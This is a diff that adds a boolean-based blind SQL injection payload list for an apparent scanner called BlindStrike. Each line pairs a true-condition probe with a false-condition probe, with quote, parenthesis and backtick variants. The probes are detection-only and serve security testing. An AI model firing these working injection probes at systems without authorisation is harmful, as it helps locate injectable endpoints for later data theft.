@@ -1,0 +1,20 @@
+# Boolean-based Blind SQLi payload pairs for --mode boolean
+# Format: TRUE_CONDITION|||FALSE_CONDITION  (one pair per line, generic/DB-agnostic where possible)
+#
+# BlindStrike sends the TRUE payload and the FALSE payload for each line, compares
+# both responses against a clean baseline, and flags the target only if the TRUE
+# response looks like normal page content while the FALSE response diverges beyond
+# the page's own measured noise floor. See README.md > "How boolean detection works".
+
+' AND 1=1-- -|||' AND 1=2-- -
+" AND 1=1-- -|||" AND 1=2-- -
+' AND '1'='1|||' AND '1'='2
+' OR 1=1-- -|||' OR 1=2-- -
+) AND 1=1-- -|||) AND 1=2-- -
+) OR 1=1-- -|||) OR 1=2-- -
+' AND SLEEP(0)='0|||' AND 1=2-- -
+AND 1=1|||AND 1=2
+OR 1=1|||OR 1=2
+' AND (SELECT 1)=1-- -|||' AND (SELECT 1)=2-- -
+' AND 'a'='a|||' AND 'a'='b
+`) AND 1=1-- -|||`) AND 1=2-- -
